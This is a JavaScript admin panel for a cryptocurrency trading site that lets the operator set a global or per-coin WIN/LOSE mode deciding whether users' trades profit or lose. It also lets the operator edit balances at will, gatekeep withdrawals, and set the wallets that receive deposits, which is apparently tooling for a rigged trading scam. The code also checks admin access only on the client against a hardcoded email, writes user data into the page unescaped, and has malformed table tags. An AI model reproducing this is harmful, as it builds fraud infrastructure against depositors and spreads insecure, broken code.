// Admin Panel - No Sidebar, Working Top Tabs
// File: js/admin.js

let adminUser = null;
let globalTradeMode = 'WIN';
let coinModes = {};

// Coins list
const coins = [
    { symbol: 'BTC', name: 'Bitcoin', icon: '₿' },
    { symbol: 'ETH', name: 'Ethereum', icon: 'Ξ' },
    { symbol: 'BNB', name: 'Binance Coin', icon: 'B' },
    { symbol: 'SOL', name: 'Solana', icon: 'S' },
    { symbol: 'XRP', name: 'XRP', icon: 'X' },
    { symbol: 'ADA', name: 'Cardano', icon: 'A' },
    { symbol: 'DOGE', name: 'Dogecoin', icon: 'Ð' },
    { symbol: 'DOT', name: 'Polkadot', icon: '●' },
    { symbol: 'LINK', name: 'Chainlink', icon: 'L' },
    { symbol: 'UNI', name: 'Uniswap', icon: 'U' },
    { symbol: 'MATIC', name: 'Polygon', icon: 'M' },
    { symbol: 'SHIB', name: 'Shiba Inu', icon: '🐕' }
];

// Initialize
document.addEventListener('DOMContentLoaded', async function() {
    console.log('Admin page loaded');
    
    if (typeof supabaseDB === 'undefined') {
        setTimeout(() => checkAdminAccess(), 500);
        return;
    }
    
    await checkAdminAccess();
});

async function checkAdminAccess() {
    const storedUser = localStorage.getItem('pocket_user') || sessionStorage.getItem('pocket_user');
    
    if (!storedUser) {
        window.location.href = 'login.html';
        return;
    }
    
    adminUser = JSON.parse(storedUser);
    
    if (adminUser.email !== 'ephremgojo@gmail.com') {
        alert('Access denied. Admin only.');
        window.location.href = 'home.html';
        return;
    }
    
    renderUserInfo();
    await loadGlobalSettings();
    await loadDashboardData();
    setupTabs();
    loadWalletSettings();
}

function renderUserInfo() {
    const userInfo = document.getElementById('userInfo');
    if (userInfo) {
        userInfo.innerHTML = `
            <span class="username">Admin: ${adminUser.name || adminUser.email}</span>
            <span class="logout-link" onclick="handleLogout()">Logout</span>
        `;
    }
}

function setupTabs() {
    const tabs = document.querySelectorAll('.admin-tab');
    const sections = ['dashboard', 'global', 'perCoin', 'users', 'withdrawals', 'pendingKYC', 'pendingDeposits', 'pendingWithdrawals', 'recentTrades', 'wallet'];
    
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            // Update active class on tabs
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            
            // Hide all sections
            sections.forEach(section => {
                const elem = document.getElementById(`${section}Section`);
                if (elem) elem.style.display = 'none';
            });
            
            // Show selected section
            const sectionName = tab.dataset.section;
            const activeSection = document.getElementById(`${sectionName}Section`);
            if (activeSection) activeSection.style.display = 'block';
            
            // Load data for specific sections
            if (sectionName === 'perCoin') loadCoinsGrid();
            if (sectionName === 'users') loadUsersTable();
            if (sectionName === 'pendingKYC') loadPendingKYC();
            if (sectionName === 'pendingDeposits') loadPendingDeposits();
            if (sectionName === 'pendingWithdrawals') loadPendingWithdrawals();
            if (sectionName === 'recentTrades') loadRecentTrades();
            if (sectionName === 'withdrawals') loadWithdrawalAddresses();
        });
    });
}

async function loadGlobalSettings() {
    try {
        const settings = await supabaseDB.get('global_settings');
        if (settings && settings.length > 0) {
            globalTradeMode = settings[0].trade_mode || 'WIN';
            coinModes = settings[0].coin_modes || {};
        } else {
            await supabaseDB.insert('global_settings', {
                id: 1,
                trade_mode: 'WIN',
                coin_modes: {}
            });
        }
        updateGlobalModeDisplay();
    } catch (error) {
        console.error('Error loading global settings:', error);
    }
}

function updateGlobalModeDisplay() {
    const displays = document.querySelectorAll('#globalModeDisplay, #globalModeDisplay2');
    const loseBtns = document.querySelectorAll('#globalLoseBtn, #globalLoseBtn2');
    const winBtns = document.querySelectorAll('#globalWinBtn, #globalWinBtn2');
    
    displays.forEach(display => {
        if (display) display.textContent = `GLOBAL MODE: ${globalTradeMode} (Users will ${globalTradeMode === 'WIN' ? 'profit on' : 'lose'} all trades)`;
    });
    
    loseBtns.forEach(btn => {
        if (btn) {
            if (globalTradeMode === 'LOSE') btn.classList.add('active');
            else btn.classList.remove('active');
        }
    });
    
    winBtns.forEach(btn => {
        if (btn) {
            if (globalTradeMode === 'WIN') btn.classList.add('active');
            else btn.classList.remove('active');
        }
    });
}

async function setGlobalMode(mode) {
    globalTradeMode = mode;
    
    try {
        await supabaseDB.update('global_settings', 1, { trade_mode: mode });
        updateGlobalModeDisplay();
        showNotification(`Global trade mode set to ${mode}`, 'success');
    } catch (error) {
        console.error('Error saving global mode:', error);
        showNotification('Error saving settings', 'error');
    }
}

async function loadDashboardData() {
    try {
        const users = await supabaseDB.getAllUsers();
        const trades = await supabaseDB.getAllTransactions();
        const kycRequests = await supabaseDB.getKYCRequests();
        const depositRequests = await supabaseDB.getDepositRequests();
        
        document.getElementById('totalUsers').textContent = users?.length || 0;
        document.getElementById('totalTrades').textContent = trades?.length || 0;
        document.getElementById('pendingKYC').textContent = kycRequests?.filter(r => r.status === 'pending').length || 0;
        document.getElementById('pendingDeposits').textContent = depositRequests?.filter(r => r.status === 'pending').length || 0;
        
        await loadUsersTable();
        await loadCoinsGrid();
    } catch (error) {
        console.error('Error loading dashboard:', error);
    }
}

async function loadCoinsGrid() {
    const container = document.getElementById('coinsGrid');
    if (!container) return;
    
    container.innerHTML = coins.map(coin => {
        const mode = coinModes[coin.symbol] || globalTradeMode;
        return `
            <div class="coin-card">
                <div class="coin-name">
                    <span style="font-size: 1.2rem;">${coin.icon}</span>
                    <div>
                        <div class="coin-symbol">${coin.symbol}</div>
                        <div class="coin-fullname">${coin.name}</div>
                    </div>
                </div>
                <div class="coin-toggle">
                    <button class="coin-lose ${mode === 'LOSE' ? 'active' : ''}" onclick="setCoinMode('${coin.symbol}', 'LOSE')">LOSE</button>
                    <button class="coin-win ${mode === 'WIN' ? 'active' : ''}" onclick="setCoinMode('${coin.symbol}', 'WIN')">WIN</button>
                </div>
            </div>
        `;
    }).join('');
}

async function setCoinMode(symbol, mode) {
    coinModes[symbol] = mode;
    
    try {
        await supabaseDB.update('global_settings', 1, { coin_modes: coinModes });
        await loadCoinsGrid();
        showNotification(`${symbol} mode set to ${mode}`, 'success');
    } catch (error) {
        console.error('Error saving coin mode:', error);
        showNotification('Error saving settings', 'error');
    }
}

async function loadUsersTable() {
    const tbody = document.getElementById('usersTableBody');
    if (!tbody) return;
    
    try {
        const users = await supabaseDB.getAllUsers();
        
        if (!users || users.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No users found</td--</tr>';
            return;
        }
        
        tbody.innerHTML = users.map(user => `
            <tr>
                <td>${user.email}</td
                <td>${user.name || '-'}</td
                <td>$${user.balance?.toFixed(2) || '0'}</td
                <td><span class="${user.kyc_status === 'verified' ? 'status-verified' : 'status-pending'}">${user.kyc_status || 'pending'}</span></td
                <td>${new Date(user.created_at).toLocaleDateString()}</td
                <td>
                    <button class="btn-edit" onclick="editBalance(${user.id})">Edit Balance</button>
                    <button class="btn-edit" onclick="editKYC(${user.id})">Edit KYC</button>
                </td
            </tr>
        `).join('');
    } catch (error) {
        console.error('Error loading users:', error);
    }
}

async function loadPendingKYC() {
    const tbody = document.getElementById('kycTableBody');
    if (!tbody) return;
    
    try {
        const requests = await supabaseDB.getKYCRequests();
        const pending = requests?.filter(r => r.status === 'pending') || [];
        
        if (pending.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No pending KYC requests</td--</tr>';
            return;
        }
        
        tbody.innerHTML = pending.map(req => `
            <tr>
                <td>${new Date(req.date).toLocaleString()}</td
                <td>${req.user_email}</td
                <td>${req.full_name}</td
                <td>${req.id_type}</td
                <td>
                    <button class="btn-edit" onclick="approveKYC(${req.id}, ${req.user_id})">Approve</button>
                    <button class="btn-edit" onclick="rejectKYC(${req.id}, ${req.user_id})">Reject</button>
                </td
            </tr>
        `).join('');
    } catch (error) {
        console.error('Error loading KYC:', error);
    }
}

async function loadPendingDeposits() {
    const tbody = document.getElementById('depositsTableBody');
    if (!tbody) return;
    
    try {
        const requests = await supabaseDB.getDepositRequests();
        const pending = requests?.filter(r => r.status === 'pending') || [];
        
        if (pending.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No pending deposits</td--</tr>';
            return;
        }
        
        tbody.innerHTML = pending.map(req => `
            <tr>
                <td>${new Date(req.date).toLocaleString()}</td
                <td>${req.user_name || req.user_email}</td
                <td>$${req.amount}</td
                <td>${req.currency}</td
                <td><button class="btn-edit" onclick="viewProof('${req.screenshot || ''}')">View</button></td
                <td>
                    <button class="btn-edit" onclick="approveDeposit(${req.id}, ${req.user_id}, ${req.amount})">Approve</button>
                    <button class="btn-edit" onclick="rejectDeposit(${req.id})">Reject</button>
                </td
            </tr>
        `).join('');
    } catch (error) {
        console.error('Error loading deposits:', error);
    }
}

async function loadPendingWithdrawals() {
    const tbody = document.getElementById('pendingWithdrawalsTableBody');
    if (!tbody) return;
    
    try {
        const requests = await supabaseDB.getWithdrawalRequests();
        const pending = requests?.filter(r => r.status === 'pending') || [];
        
        if (pending.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No pending withdrawals</td--</tr>';
            return;
        }
        
        tbody.innerHTML = pending.map(req => `
            <tr>
                <td>${new Date(req.date).toLocaleString()}</td
                <td>${req.user_name || req.user_email}</td
                <td>$${req.amount}</td
                <td>${req.crypto}</td
                <td>${req.wallet_address?.substring(0, 20)}...</td
                <td>
                    <button class="btn-edit" onclick="approveWithdrawal(${req.id}, ${req.user_id}, ${req.amount})">Approve</button>
                    <button class="btn-edit" onclick="rejectWithdrawal(${req.id}, ${req.user_id}, ${req.amount})">Reject</button>
                </td
            </tr>
        `).join('');
    } catch (error) {
        console.error('Error loading withdrawals:', error);
    }
}

async function loadRecentTrades() {
    const tbody = document.getElementById('tradesTableBody');
    if (!tbody) return;
    
    try {
        const trades = await supabaseDB.getAllTransactions();
        const recent = trades?.slice(-20).reverse() || [];
        
        if (recent.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No trades found</td--</tr>';
            return;
        }
        
        const users = await supabaseDB.getAllUsers();
        const userMap = {};
        if (users) users.forEach(u => { userMap[u.id] = u.name || u.email; });
        
        tbody.innerHTML = recent.map(trade => {
            const outcome = trade.pnl > 0 ? 'WON' : (trade.pnl < 0 ? 'LOST' : 'PENDING');
            const profitClass = trade.pnl > 0 ? 'won' : (trade.pnl < 0 ? 'lost' : '');
            
            return `
                <tr>
                    <td>${userMap[trade.user_id] || trade.user_id}</td
                    <td>${trade.crypto || 'BTC'}</td
                    <td>$${trade.amount?.toFixed(2)}</td
                    <td><span class="trade-outcome ${profitClass}">${outcome}</span></td
                    <td>${trade.pnl > 0 ? '+' : ''}$${trade.pnl?.toFixed(2) || '0'}</td
                    <td>Auto</td
                </tr>
            `;
        }).join('');
    } catch (error) {
        console.error('Error loading trades:', error);
    }
}

async function loadWithdrawalAddresses() {
    const tbody = document.getElementById('withdrawalsTableBody');
    if (!tbody) return;
    
    try {
        const requests = await supabaseDB.getWithdrawalRequests();
        const addresses = requests?.filter(r => r.status === 'approved') || [];
        
        if (addresses.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No saved addresses found</td--</tr>';
            return;
        }
        
        tbody.innerHTML = addresses.map(req => `
            <tr>
                <td>${req.user_name || req.user_email}</td
                <td>${req.wallet_address?.substring(0, 30)}...</td
                <td>${req.crypto}</td
                <td><span class="status-verified">Active</span></td
                <td>${new Date(req.date).toLocaleDateString()}</td
                <td><button class="btn-edit" onclick="blacklistAddress('${req.wallet_address}')">Blacklist</button></td
            </tr>
        `).join('');
    } catch (error) {
        console.error('Error loading withdrawal addresses:', error);
    }
}

async function editBalance(userId) {
    const newBalance = prompt('Enter new balance amount:');
    if (newBalance && !isNaN(newBalance)) {
        try {
            await supabaseDB.updateUserBalance(userId, parseFloat(newBalance));
            showNotification('Balance updated successfully!', 'success');
            await loadUsersTable();
        } catch (error) {
            showNotification('Error updating balance', 'error');
        }
    }
}

async function editKYC(userId) {
    const newStatus = prompt('Enter KYC status (verified/pending/rejected):');
    if (newStatus) {
        try {
            await supabaseDB.updateUserKYCStatus(userId, newStatus);
            showNotification('KYC status updated!', 'success');
            await loadUsersTable();
        } catch (error) {
            showNotification('Error updating KYC', 'error');
        }
    }
}

async function approveKYC(requestId, userId) {
    try {
        await supabaseDB.update('kyc_requests', requestId, { status: 'approved' });
        await supabaseDB.updateUserKYCStatus(userId, 'verified');
        showNotification('KYC approved successfully!', 'success');
        await loadPendingKYC();
        await loadUsersTable();
    } catch (error) {
        showNotification('Error approving KYC', 'error');
    }
}

async function rejectKYC(requestId, userId) {
    try {
        await supabaseDB.update('kyc_requests', requestId, { status: 'rejected' });
        await supabaseDB.updateUserKYCStatus(userId, 'rejected');
        showNotification('KYC rejected!', 'success');
        await loadPendingKYC();
        await loadUsersTable();
    } catch (error) {
        showNotification('Error rejecting KYC', 'error');
    }
}

async function approveDeposit(requestId, userId, amount) {
    try {
        await supabaseDB.update('deposit_requests', requestId, { status: 'approved' });
        
        const users = await supabaseDB.getAllUsers();
        const user = users.find(u => u.id === userId);
        if (user) {
            const newBalance = (user.balance || 0) + amount;
            await supabaseDB.updateUserBalance(userId, newBalance);
        }
        
        showNotification(`Deposit of $${amount} approved!`, 'success');
        await loadPendingDeposits();
        await loadUsersTable();
    } catch (error) {
        showNotification('Error approving deposit', 'error');
    }
}

async function rejectDeposit(requestId) {
    try {
        await supabaseDB.update('deposit_requests', requestId, { status: 'rejected' });
        showNotification('Deposit rejected!', 'success');
        await loadPendingDeposits();
    } catch (error) {
        showNotification('Error rejecting deposit', 'error');
    }
}

async function approveWithdrawal(requestId, userId, amount) {
    try {
        await supabaseDB.update('withdrawal_requests', requestId, { status: 'approved' });
        showNotification(`Withdrawal of $${amount} approved!`, 'success');
        await loadPendingWithdrawals();
    } catch (error) {
        showNotification('Error approving withdrawal', 'error');
    }
}

async function rejectWithdrawal(requestId, userId, amount) {
    try {
        await supabaseDB.update('withdrawal_requests', requestId, { status: 'rejected' });
        
        const users = await supabaseDB.getAllUsers();
        const user = users.find(u => u.id === userId);
        if (user) {
            const newBalance = (user.balance || 0) + amount;
            await supabaseDB.updateUserBalance(userId, newBalance);
        }
        
        showNotification('Withdrawal rejected. Amount refunded.', 'success');
        await loadPendingWithdrawals();
        await loadUsersTable();
    } catch (error) {
        showNotification('Error rejecting withdrawal', 'error');
    }
}

function viewProof(screenshot) {
    alert(`Proof of payment: ${screenshot}\n\n(Image would be displayed here in production)`);
}

function blacklistAddress(address) {
    if (confirm(`Blacklist address: ${address}?`)) {
        showNotification('Address blacklisted!', 'success');
    }
}

async function loadWalletSettings() {
    try {
        const settings = await supabaseDB.getWalletSettings();
        if (settings) {
            document.getElementById('adminEthAddress').value = settings.eth_address || '';
            document.getElementById('adminBtcAddress').value = settings.btc_address || '';
            document.getElementById('adminUsdtAddress').value = settings.usdt_address || '';
        }
    } catch (error) {
        console.error('Error loading wallet settings:', error);
    }
}

async function saveWalletSettings() {
    try {
        const settings = {
            eth_address: document.getElementById('adminEthAddress').value,
            btc_address: document.getElementById('adminBtcAddress').value,
            usdt_address: document.getElementById('adminUsdtAddress').value,
            updated_at: new Date().toISOString()
        };
        
        await supabaseDB.updateWalletSettings(settings);
        showNotification('Wallet addresses saved!', 'success');
    } catch (error) {
        showNotification('Error saving wallet settings', 'error');
    }
}

function showNotification(message, type) {
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === 'error' ? '#FF4757' : '#00D897'};
        color: white;
        padding: 12px 20px;
        border-radius: 12px;
        font-size: 14px;
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    `;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

function handleLogout() {
    localStorage.removeItem('pocket_user');
    sessionStorage.removeItem('pocket_user');
    window.location.href = 'home.html';
}

// Make functions global
window.setGlobalMode = setGlobalMode;
window.setCoinMode = setCoinMode;
window.editBalance = editBalance;
window.editKYC = editKYC;
window.approveKYC = approveKYC;
window.rejectKYC = rejectKYC;
window.approveDeposit = approveDeposit;
window.rejectDeposit = rejectDeposit;
window.approveWithdrawal = approveWithdrawal;
window.rejectWithdrawal = rejectWithdrawal;
window.viewProof = viewProof;
window.saveWalletSettings = saveWalletSettings;
window.blacklistAddress = blacklistAddress;
window.handleLogout = handleLogout;
